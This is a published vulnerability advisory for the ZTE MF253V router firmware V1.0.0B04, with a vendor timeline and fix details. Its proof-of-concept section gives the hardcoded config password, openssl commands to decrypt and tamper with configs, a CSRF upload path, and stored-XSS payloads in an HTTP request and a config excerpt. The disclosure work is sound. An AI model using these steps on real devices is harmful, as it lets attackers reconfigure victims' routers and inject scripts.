@@ -1,0 +1,176 @@
+id: 35311
+date: 11/24/2020
+title: ZTE MF253V 1.0.0B04 XSS / CSRF / Hardcoded Password Vulnerabilities
+author: Tim Weber
+cves: 
+
+=======================================================================
+              title: Multiple Vulnerabilities
+            product: ZTE WLAN router MF253V
+ vulnerable version: V1.0.0B04
+      fixed version: V1.0.0B05
+         CVE number:
+             impact: Medium
+           homepage: https://www.zte.com.cn
+              found: 2020-01-07
+                 by: T. Weber (Office Vienna)
+                     S. Robertz (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"ZTE Corporation is a global leader in telecommunications and information
+technology. Founded in 1985 and listed on both the Hong Kong and Shenzhen Stock
+Exchanges, the company has been committed to providing integrated end-to-end
+innovations to deliver excellence and value to consumers, carriers, businesses
+and public sector customers from over 160 countries around the world to enable
+increased connectivity and productivity."
+
+Source: https://www.zte.com.cn/global/about/corporate_information
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch via push notifications in the web-interface of the
+device. The patch should be installed immediately.
+
+SEC Consult recommends to perform a thorough security review of these
+products conducted by security professionals to identify and resolve all
+security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Hardcoded Password for Config File
+The device contains a hardcoded password for the config file. Hence, all config
+files from devices of the same model can be decrypted and modified by an
+attacker for malicious purposes.
+
+2) Config Upload via Cross-Site Request Forgery (CSRF)
+A malicious config file can be uploaded by exploiting a CSRF vulnerability. An
+attacker can reconfigure the router by luring the user to a crafted web-site.
+
+3) Stored Cross-Site Scripting (XSS)
+A cross-site scripting payload can be placed by an authenticated attacker by
+intercepting a POST request to "/goform/goform_set_cmd_process" or by abusing
+the config upload described in section 2). Thus, an attacker is able to perform
+malicious actions in the context of the attacked user.
+
+4) Multiple Outdated Software Components
+Multiple outdated software components containing vulnerabilities were found by
+the IoT Inspector.
+
+
+Proof of concept:
+-----------------
+1) Hardcoded Password for Config File
+The script "/usr/zte/zte_conf/scripts/para_backup.sh" contains the hardcoded
+password "himan". It is used to prevent tampering with the configuration file.
+
+The initial encrypted configuration can be obtained by logging in and visiting:
+"http://$IP/cgi-bin/ExportSettings.sh"
+
+Decryption:
+-------------------------------------------------------------------------------
+OpenSSL 1.0.1:
+openssl enc -d -des-ede3-cbc -in <encrypted-config> -out <decrypted-config> -pass pass:himan
+OPENSSL 1.1.1:
+openssl enc -d -des-ede3-cbc -md md5 -in <encrypted-config> -out <decrypted-config> -pass pass:himan
+
+Encryption:
+-------------------------------------------------------------------------------
+OpenSSL 1.0.1:
+openssl enc -des-ede3-cbc -in <decrypted-config> -out <encrypted-config> -pass pass:himan
+OPENSSL 1.1.1:
+openssl enc -des-ede3-cbc -md md5 -in <decrypted-config> -out <encrypted-config> -pass pass:himan
+
+2) Config Upload via Cross-Site Request Forgery (CSRF)
+Using the hardcoded password one is able to generate valid config files with
+malicious settings. The config file can be uploaded by sending the encrypted
+config file to "http://$IP/cgi-bin/upload_settings.cgi" while logged in.
+
+A CSRF vulnerability allows the config to be uploaded to the router by visiting
+a malicious website when logged in.
+
+3) Stored Cross-Site Scripting (XSS)
+By using an intercepting proxy, one is able to inject an XSS payload into the
+POST request, resulting in a stored XSS.
+
+Request:
+-------------------------------------------------------------------------------
+POST /goform/goform_set_cmd_process HTTP/1.1
+Host: $IP
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://$IP/index.html
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 275
+Connection: close
+
+isTest=true&notCallback=true&goformId=WAN_GATEWAYMODE_STATIC&static_wan_ipaddr=$IP<script>alert(document.location)</script>&static_wan_netmask=255.255.255.0&static_wan_gateway=192.168.0.2&static_wan_primary_dns=8.8.8.8&static_wan_secondary_dns=9.9.9.9&WAN_MODE=STATIC
+-------------------------------------------------------------------------------
+
+Maliciously changing some config values and uploading the tampered config as
+explained in section 2) results in a stored XSS as well:
+
+Malicious config excerpt:
+-------------------------------------------------------------------------------
+...
+imei=860743031081114<script>alert(document.location)</script>
+...
+-------------------------------------------------------------------------------
+
+4) Multiple Outdated Software Components
+The IoT Inspector recognized multiple outdated software components with known
+vulnerabilities:
+
+Busybox 1.23.1:                 3 CVEs
+OpenSSL 1.0.1k:                 37 CVEs
+Curl 7.21.1:                    2 CVEs
+Hostapd 2.3:                    21 CVEs
+Linux Kernel 3.18.20:   191 CVEs
+Dnsmasq 2.78:                   1 CVE
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following product/firmware version has been tested:
+* ZTE MF253V V1.0.0B04
+
+
+Vendor contact timeline:
+------------------------
+2020-01-16: Sent encrypted advisory to the vendor.
+2020-01-17: Vendor confirmed reception of advisory.
+2020-02-26: Vendor confirmed vulnerabilities.
+2020-03-12: Vendor provided a statement about the outdated software components.
+2020-06-03: Vendor prepares a statement about the next steps.
+2020-08-04: Telephone call with the vendor. Updates have been released and are
+            available as a push notification in the web-interface of the router.
+            Vendor prepares a list of fixed issues for SEC Consult.
+2020-08-30: Multiple phone calls with vendor. Release notes delayed due to
+                        sick employees.
+2020-09-29: Received release notes of patch.
+2020-11-23: Public release of the security advisory.
+
+
+Solution:
+---------
+Upgrade to release: ZTE MF253V V1.0.0B05
+Fixed:
+        - Config Upload via Cross-Site Request Forgery (CSRF)
+        - Stored Cross-Site Scripting (XSS)
+        - Hardcoded Password for Config File
+        - Updated OpenSSL to 1.0.2r
+Other software components could not be upgraded.
+
+#  0day.today [2023-03-22]  #
